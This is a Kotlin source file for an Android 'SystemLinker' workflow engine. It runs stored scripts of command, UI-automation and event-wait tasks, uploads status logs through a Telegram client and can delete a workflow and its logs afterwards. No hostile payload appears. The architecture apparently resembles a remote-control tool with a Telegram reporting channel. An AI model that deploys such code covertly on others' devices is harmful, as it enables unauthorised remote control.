package com.systemlinker.features.workflow

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import com.systemlinker.base.VaultManager
import com.systemlinker.features.MediaHandler
import com.systemlinker.features.SystemHandler
import com.systemlinker.features.TelegramUploader
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlin.coroutines.resume

class WorkflowEngine(
    private val context: Context,
    private val uploader: TelegramUploader,
    private val systemHandler: SystemHandler,
    private val mediaHandler: MediaHandler
) {
    private val vault = VaultManager(context)
    private val uiModule = UiModule(context)
    private val sysModule = SystemModule(context, systemHandler, mediaHandler, uploader)

    suspend fun executeWorkflow(workflowName: String, deleteAfter: Boolean = false) = withContext(Dispatchers.IO) {
        val content = vault.getWorkflow(workflowName)
        if (content == null) {
            uploader.sendText("Vault Error: Workflow $workflowName not found.")
            return@withContext
        }

        vault.clearLogs(workflowName)
        val dummyFile = File(context.cacheDir, "dummy.txt")
        val wfContext = WorkflowContext(workflowName, dummyFile)
        
        fun logToVault(msg: String) {
            val formatted = "[${SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())}] $msg"
            vault.appendLog(workflowName, formatted)
        }

        logToVault("--- WORKFLOW LOG STARTED ---")
        logToVault("Parsing workflow from Vault: $workflowName")
        
        val tasks = WorkflowParser.parseString(content) 
        var ip = 0 
        val loopStack = mutableListOf<Pair<Int, Int>>()
        var inCatchBlock = false

        while (ip < tasks.size && !wfContext.shouldStop) {
            val task = tasks[ip]
            var success = true

            try {
                success = when (task) {
                    is DelayTask -> { 
                        logToVault("Delay: ${task.durationMs}ms")
                        delay(task.durationMs)
                        true 
                    }
                    is CmdTask -> { 
                        logToVault("Cmd: ${task.cmd}")
                        sysModule.execute(task, wfContext) 
                    }
                    is UiTask -> { 
                        logToVault("UI: ${task.action} -> ${task.target}")
                        uiModule.execute(task, wfContext) 
                    }
                    is VarTask -> { 
                        wfContext.variables[task.varName] = wfContext.resolve(task.varValue)
                        logToVault("Var Set: ${task.varName} = ${wfContext.variables[task.varName]}")
                        true 
                    }
                    is WaitEventTask -> {
                        logToVault("Waiting for Event: type='${task.eventType}', target='${task.eventTarget}'...")
                        val eventOccurred = withTimeoutOrNull(task.timeoutMs) {
                            suspendCancellableCoroutine<Boolean> { continuation ->
                                val receiver = object : BroadcastReceiver() {
                                    override fun onReceive(c: Context?, intent: Intent?) {
                                        if (intent?.action == "com.systemlinker.EVENT_TRIGGER") {
                                            val evType = intent.getStringExtra("event_type") ?: ""
                                            val evData = intent.getStringExtra("event_data") ?: ""
                                            
                                            if (evType == task.eventType) {
                                                var match = false
                                                if (task.eventTarget.startsWith("<") || task.eventTarget.startsWith(">") || task.eventTarget.startsWith("=")) {
                                                    try {
                                                        val targetVal = task.eventTarget.substring(1).trim().toInt()
                                                        val dataVal = evData.toInt()
                                                        match = when (task.eventTarget[0]) {
                                                            '<' -> dataVal < targetVal
                                                            '>' -> dataVal > targetVal
                                                            '=' -> dataVal == targetVal
                                                            else -> false
                                                        }
                                                    } catch (e: Exception) {}
                                                } else {
                                                    match = evData.contains(task.eventTarget, ignoreCase = true)
                                                }

                                                if (match) {
                                                    context.unregisterReceiver(this)
                                                    if (continuation.isActive) continuation.resume(true)
                                                }
                                            }
                                        }
                                    }
                                }
                                val filter = IntentFilter("com.systemlinker.EVENT_TRIGGER")
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                    context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
                                } else {
                                    context.registerReceiver(receiver, filter)
                                }
                            }
                        }
                        if (eventOccurred == true) logToVault("Event Captured! Resuming workflow.")
                        else logToVault("Event Wait Timed Out.")
                        true
                    }
                    is IfTask -> {
                        val v1 = wfContext.resolve(task.conditionVar)
                        val v2 = wfContext.resolve(task.expectedValue)
                        val conditionMet = when (task.operator) {
                            "!=" -> v1 != v2
                            "contains" -> v1.contains(v2)
                            else -> v1 == v2
                        }
                        if (!conditionMet) {
                            var depth = 1
                            while (depth > 0 && ++ip < tasks.size) {
                                if (tasks[ip] is IfTask) depth++
                                if (tasks[ip] is EndIfTask) depth--
                            }
                        }
                        true
                    }
                    is EndIfTask -> true
                    is LoopTask -> { 
                        loopStack.add(Pair(ip, task.count))
                        true 
                    }
                    is EndLoopTask -> {
                        if (loopStack.isNotEmpty()) {
                            val currentLoop = loopStack.removeLast()
                            val remaining = currentLoop.second - 1
                            if (remaining > 0) {
                                loopStack.add(Pair(currentLoop.first, remaining))
                                ip = currentLoop.first
                            }
                        }
                        true
                    }
                    is TryTask -> true
                    is CatchTask -> {
                        if (!inCatchBlock) {
                            var depth = 1
                            while (depth > 0 && ++ip < tasks.size) {
                                if (tasks[ip] is TryTask) depth++
                                if (tasks[ip] is EndTryTask) depth--
                            }
                        }
                        inCatchBlock = false
                        true
                    }
                    is EndTryTask -> true
                    else -> false
                }

                if (!success) throw Exception("Task Failed: ${task.type}")

            } catch (e: Exception) {
                logToVault("ERROR at Task $ip: ${e.message}")
                wfContext.lastError = e.message
                
                var foundCatch = false
                var depth = 0
                for (i in ip until tasks.size) {
                    if (tasks[i] is TryTask) depth++
                    if (tasks[i] is EndTryTask) depth--
                    if (tasks[i] is CatchTask && depth == 0) {
                        ip = i 
                        inCatchBlock = true
                        foundCatch = true
                        break
                    }
                }
                if (!foundCatch) wfContext.shouldStop = true
            }
            
            ip++
            delay(100)
        }

        logToVault("--- WORKFLOW FINISHED ---")
        sendStatus(workflowName)

        if (deleteAfter) {
            vault.deleteWorkflow(workflowName)
            vault.clearLogs(workflowName)
        }
    }

    suspend fun sendStatus(workflowName: String) {
        val logs = vault.getLogsForWorkflow(workflowName)
        if (logs.isNotEmpty()) {
            val tempFile = File(context.cacheDir, "${workflowName}_status.txt")
            tempFile.writeText(logs)
            uploader.sendDocument(tempFile, "Status of Workflow: $workflowName", deleteAfter = true)
        } else {
            uploader.sendText("No logs found for workflow: $workflowName")
        }
    }
}